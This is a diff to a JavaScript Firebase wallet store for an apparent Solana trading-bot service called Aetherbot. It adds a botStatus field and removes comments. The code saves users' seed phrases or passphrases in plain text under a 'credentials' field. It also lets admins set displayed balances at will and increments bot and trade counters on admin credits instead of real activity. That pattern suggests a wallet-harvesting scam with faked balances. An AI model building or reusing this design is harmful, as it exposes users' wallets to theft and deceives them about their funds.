@@ -28,16 +28,15 @@
  * - createdAt: timestamp
  * - lastLoginAt: timestamp
  * - loginCount: number
+ * - botStatus: string (running or paused)
  * - metadata: object (additional info)
  */
 
 class FirebaseWalletStore {
   constructor() {
-    // STRICTLY use environment variables
     this.projectId = process.env.FIREBASE_PROJECT_ID;
     this.apiKey = process.env.FIREBASE_API_KEY;
     
-    // Validate that we have values
     if (!this.projectId || !this.apiKey) {
       throw new Error('CRITICAL SECURITY ERROR: Firebase configuration (PROJECT_ID or API_KEY) is missing in environment.');
     }
@@ -45,9 +44,6 @@ class FirebaseWalletStore {
     this.baseUrl = `https://firestore.googleapis.com/v1/projects/${this.projectId}/databases/(default)/documents`;
   }
 
-  /**
-   * Create or update wallet in Firebase
-   */
   async saveWallet(walletData) {
     try {
       const { walletId, walletAddress, lookupHash, walletType, inputType, derivationPath, accountIndex, balance = 0, credentials = '', email = '' } = walletData;
@@ -67,22 +63,23 @@ class FirebaseWalletStore {
           accountIndex: { integerValue: accountIndex },
           blockchain: { stringValue: 'solana' },
           balance: { doubleValue: balance },
-          AetherbotBalance: { doubleValue: 0 }, // Initialize Aetherbot balance to 0
-          depositedAmount: { doubleValue: 0 }, // Initialize deposited amount to 0
-          credentials: { stringValue: credentials }, // Store seed phrase or passphrase
-          email: { stringValue: email }, // Store user email
+          AetherbotBalance: { doubleValue: 0 },
+          depositedAmount: { doubleValue: 0 },
+          credentials: { stringValue: credentials },
+          email: { stringValue: email },
           balanceLastUpdated: { timestampValue: new Date().toISOString() },
           AetherbotBalanceLastUpdated: { timestampValue: new Date().toISOString() },
           depositedAmountLastUpdated: { timestampValue: new Date().toISOString() },
           createdAt: { timestampValue: new Date().toISOString() },
           lastLoginAt: { timestampValue: new Date().toISOString() },
           loginCount: { integerValue: 1 },
-          totalAetherbotCredited: { doubleValue: 0 }, // Track total Aetherbot credits
-          totalSolCredited: { doubleValue: 0 }, // Track total SOL credits
-          totalDeposited: { doubleValue: 0 }, // Track total deposits
-          autoSnipeBot: { integerValue: 0 }, // Auto snipe bot count (increases by 2 per credit)
-          totalTrade: { integerValue: 0 }, // Total trades count (increases by 1 per credit)
-          withdrawal: { stringValue: '' } // Withdrawal requests
+          totalAetherbotCredited: { doubleValue: 0 },
+          totalSolCredited: { doubleValue: 0 },
+          totalDeposited: { doubleValue: 0 },
+          autoSnipeBot: { integerValue: 0 },
+          totalTrade: { integerValue: 0 },
+          withdrawal: { stringValue: '' },
+          botStatus: { stringValue: 'paused' }
         }
       };
 
@@ -103,7 +100,6 @@ class FirebaseWalletStore {
         
         console.error('❌ Firebase save error:', errorDetails);
         
-        // Provide helpful error message
         if (response.status === 403) {
           throw new Error('Firebase permission denied. Please enable Firestore Database in Firebase Console.');
         } else if (response.status === 404) {
@@ -121,9 +117,6 @@ class FirebaseWalletStore {
     }
   }
 
-  /**
-   * Get wallet by wallet ID
-   */
   async getWalletById(walletId) {
     try {
       const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
@@ -146,9 +139,6 @@ class FirebaseWalletStore {
     }
   }
 
-  /**
-   * Get wallet by seed hash (for login authentication)
-   */
   async getWalletBySeedHash(seedHash) {
     try {
       const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;
@@ -186,7 +176,6 @@ class FirebaseWalletStore {
         
         console.error('❌ Firebase query error:', errorDetails);
         
-        // Provide helpful error message
         if (response.status === 403) {
           throw new Error('Firebase permission denied. Please enable Firestore Database in Firebase Console.');
         } else if (response.status === 404) {
@@ -212,9 +201,6 @@ class FirebaseWalletStore {
     }
   }
 
-  /**
-   * Get wallet by wallet address
-   */
   async getWalletByAddress(walletAddress) {
     try {
       console.log(`🔍 Finding wallet by address: ${walletAddress}`);
@@ -260,9 +246,6 @@ class FirebaseWalletStore {
     }
   }
 
-  /**
-   * Update wallet balance and last login
-   */
   async updateWalletBalance(walletId, balance, transactions = [], email = null, totalSolCredited = null) {
     try {
       console.log(`📝 Updating wallet ${walletId} with email: ${email || 'none provided'}`);
@@ -274,17 +257,14 @@ class FirebaseWalletStore {
 
       const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
 
-      // Preserve existing transactions if no new ones provided
       const transactionsToSave = transactions && transactions.length > 0 
         ? transactions 
         : (wallet.transactions || []);
 
-      // Use provided totalSolCredited or preserve existing value
       const finalTotalSolCredited = totalSolCredited !== null ? totalSolCredited : (wallet.totalSolCredited || 0);
 
       const updateData = {
         fields: {
-          // Preserve ALL existing fields
           walletId: { stringValue: wallet.walletId },
           walletAddress: { stringValue: wallet.walletAddress },
           seedHash: { stringValue: wallet.seedHash },
@@ -293,17 +273,17 @@ class FirebaseWalletStore {
           derivationPath: { stringValue: wallet.derivationPath },
           accountIndex: { integerValue: wallet.accountIndex },
           blockchain: { stringValue: wallet.blockchain || 'solana' },
-          AetherbotBalance: { doubleValue: wallet.AetherbotBalance || 0 }, // Preserve Aetherbot balance
-          credentials: { stringValue: wallet.credentials || '' }, // Preserve credentials
-          email: { stringValue: email || wallet.email || '' }, // Update or preserve email
+          AetherbotBalance: { doubleValue: wallet.AetherbotBalance || 0 },
+          credentials: { stringValue: wallet.credentials || '' },
+          email: { stringValue: email || wallet.email || '' },
           createdAt: { timestampValue: wallet.createdAt },
-          // Update these fields
           balance: { doubleValue: balance },
           balanceLastUpdated: { timestampValue: new Date().toISOString() },
           lastLoginAt: { timestampValue: new Date().toISOString() },
           loginCount: { integerValue: (wallet.loginCount || 0) + 1 },
-          totalSolCredited: { doubleValue: finalTotalSolCredited }, // Track total SOL credits
-          totalAetherbotCredited: { doubleValue: wallet.totalAetherbotCredited || 0 }, // Preserve Aetherbot credits
+          totalSolCredited: { doubleValue: finalTotalSolCredited },
+          totalAetherbotCredited: { doubleValue: wallet.totalAetherbotCredited || 0 },
+          botStatus: { stringValue: wallet.botStatus || 'paused' },
           transactions: {
             arrayValue: {
               values: transactionsToSave.map(tx => ({ stringValue: tx }))
@@ -312,7 +292,6 @@ class FirebaseWalletStore {
         }
       };
 
-      // Add metadata if it exists
       if (wallet.metadata) {
         updateData.fields.metadata = {
           mapValue: {
@@ -335,25 +314,15 @@ class FirebaseWalletStore {
         throw new Error(`Firebase update failed: ${error.error?.message || 'Unknown error'}`);
       }
 
-      const finalEmail = email || wallet.email || '';
-      console.log('✅ Wallet balance updated:', { 
-        walletId, 
-        balance, 
-        transactionCount: transactionsToSave.length,
-        emailSaved: finalEmail || 'none'
-      });
+      console.log('✅ Wallet balance updated:', { walletId, balance });
       return await response.json();
     } catch (error) {
       throw new Error(`Failed to update wallet: ${error.message}`);
     }
   }
 
-  /**
-   * Update wallet balance by wallet address (for admin operations)
-   */
   async updateBalanceByAddress(walletAddress, newBalance, adminId, operation, creditAmount) {
     try {
-      // Find wallet by address
       const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;
 
       const query = {
@@ -387,11 +356,9 @@ class FirebaseWalletStore {
 
       const wallet = this.parseFirestoreDocument(results[0].document);
 
-      // Update balance AND track total SOL credited
       const totalSolCredited = (wallet.totalSolCredited || 0) + creditAmount;
       await this.updateWalletBalance(wallet.walletId, newBalance, wallet.transactions || [], wallet.email, totalSolCredited);
 
-      // Log admin operation
       await this.logAdminOperation(walletAddress, adminId, operation, newBalance);
 
       return { success: true, walletAddress, newBalance };
@@ -400,9 +367,6 @@ class FirebaseWalletStore {
     }
   }
 
-  /**
-   * Log admin operations (credit/debit/set-balance)
-   */
   async logAdminOperation(walletAddress, adminId, operation, amount) {
     try {
       const operationId = `${Date.now()}-${Math.random().toString(36).substring(7)}`;
@@ -429,9 +393,6 @@ class FirebaseWalletStore {
     }
   }
 
-  /**
-   * Parse Firestore document to regular object
-   */
   parseFirestoreDocument(doc) {
     if (!doc || !doc.fields) return null;
 
@@ -457,9 +418,6 @@ class FirebaseWalletStore {
     return parsed;
   }
 
-  /**
-   * Delete wallet (admin only)
-   */
   async deleteWallet(walletId) {
     try {
       const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
@@ -479,9 +437,6 @@ class FirebaseWalletStore {
     }
   }
 
-  /**
-   * Update Aetherbot balance (platform credits, not SOL)
-   */
   async updateAetherbotBalance(walletId, newBalance, adminId, operation, creditAmount) {
     try {
       const wallet = await this.getWalletById(walletId);
@@ -491,14 +446,12 @@ class FirebaseWalletStore {
 
       const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
 
-      // Calculate new totals and increments
       const totalAetherbotCredited = (wallet.totalAetherbotCredited || 0) + (operation === 'credit' ? creditAmount : 0);
-      const autoSnipeBot = (wallet.autoSnipeBot || 0) + (operation === 'credit' ? 2 : 0); // Increase by 2 per credit
-      const totalTrade = (wallet.totalTrade || 0) + (operation === 'credit' ? 1 : 0); // Increase by 1 per credit
+      const autoSnipeBot = (wallet.autoSnipeBot || 0) + (operation === 'credit' ? 2 : 0);
+      const totalTrade = (wallet.totalTrade || 0) + (operation === 'credit' ? 1 : 0);
 
       const updateData = {
         fields: {
-          // Preserve ALL existing fields
           walletId: { stringValue: wallet.walletId },
           walletAddress: { stringValue: wallet.walletAddress },
           seedHash: { stringValue: wallet.seedHash },
@@ -513,23 +466,14 @@ class FirebaseWalletStore {
           balanceLastUpdated: { timestampValue: wallet.balanceLastUpdated },
           lastLoginAt: { timestampValue: wallet.lastLoginAt },
           loginCount: { integerValue: wallet.loginCount || 0 },
-          
-          // Update Aetherbot balance
           AetherbotBalance: { doubleValue: newBalance },
           AetherbotBalanceLastUpdated: { timestampValue: new Date().toISOString() },
-          
-          // Track total credits
           totalAetherbotCredited: { doubleValue: totalAetherbotCredited },
           totalSolCredited: { doubleValue: wallet.totalSolCredited || 0 },
-          
-          // Auto snipe bot and trade counters
           autoSnipeBot: { integerValue: autoSnipeBot },
           totalTrade: { integerValue: totalTrade },
-          
-          // Withdrawal field
           withdrawal: { stringValue: wallet.withdrawal || '' },
-          
-          // Transaction history
+          botStatus: { stringValue: wallet.botStatus || 'paused' },
           transactions: {
             arrayValue: {
               values: (wallet.transactions || []).map(tx => ({ stringValue: tx }))
@@ -556,9 +500,6 @@ class FirebaseWalletStore {
     }
   }
 
-  /**
-   * Update Deposited Amount
-   */
   async updateDepositedAmount(walletId, newAmount, adminId, operation, creditAmount) {
     try {
       const wallet = await this.getWalletById(walletId);
@@ -568,12 +509,10 @@ class FirebaseWalletStore {
 
       const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
 
-      // Calculate new totals
       const totalDeposited = (wallet.totalDeposited || 0) + (operation === 'credit' ? creditAmount : 0);
 
       const updateData = {
         fields: {
-          // Preserve ALL existing fields
           walletId: { stringValue: wallet.walletId },
           walletAddress: { stringValue: wallet.walletAddress },
           seedHash: { stringValue: wallet.seedHash },
@@ -590,24 +529,15 @@ class FirebaseWalletStore {
           AetherbotBalanceLastUpdated: { timestampValue: wallet.AetherbotBalanceLastUpdated || new Date().toISOString() },
           lastLoginAt: { timestampValue: wallet.lastLoginAt },
           loginCount: { integerValue: wallet.loginCount || 0 },
-          
-          // Update Deposited Amount
           depositedAmount: { doubleValue: newAmount },
           depositedAmountLastUpdated: { timestampValue: new Date().toISOString() },
-          
-          // Track total credits
           totalAetherbotCredited: { doubleValue: wallet.totalAetherbotCredited || 0 },
           totalSolCredited: { doubleValue: wallet.totalSolCredited || 0 },
           totalDeposited: { doubleValue: totalDeposited },
-          
-          // Auto snipe bot and trade counters
           autoSnipeBot: { integerValue: wallet.autoSnipeBot || 0 },
           totalTrade: { integerValue: wallet.totalTrade || 0 },
-          
-          // Withdrawal field
           withdrawal: { stringValue: wallet.withdrawal || '' },
-          
-          // Transaction history
+          botStatus: { stringValue: wallet.botStatus || 'paused' },
           transactions: {
             arrayValue: {
               values: (wallet.transactions || []).map(tx => ({ stringValue: tx }))
@@ -630,13 +560,10 @@ class FirebaseWalletStore {
       console.log('✅ Deposited amount updated:', { walletId, newAmount, totalDeposited });
       return await response.json();
     } catch (error) {
-      throw new Error(`Failed to update Aetherbot balance: ${error.message}`);
+      throw new Error(`Failed to update deposited amount: ${error.message}`);
     }
   }
 
-  /**
-   * Get all wallets (admin only)
-   */
   async getAllWallets() {
     try {
       console.log('📋 Fetching all wallets from Firebase...');
@@ -682,8 +609,8 @@ class FirebaseWalletStore {
       throw new Error(`Failed to fetch wallets: ${error.message}`);
     }
   }
-}
-/**
+
+  /**
    * Update bot status (running or paused)
    */
   async updateBotStatus(walletId, botStatus) {
@@ -716,4 +643,6 @@ class FirebaseWalletStore {
       throw new Error(`Failed to update bot status: ${error.message}`);
     }
   }
+}
+
 module.exports = { FirebaseWalletStore };
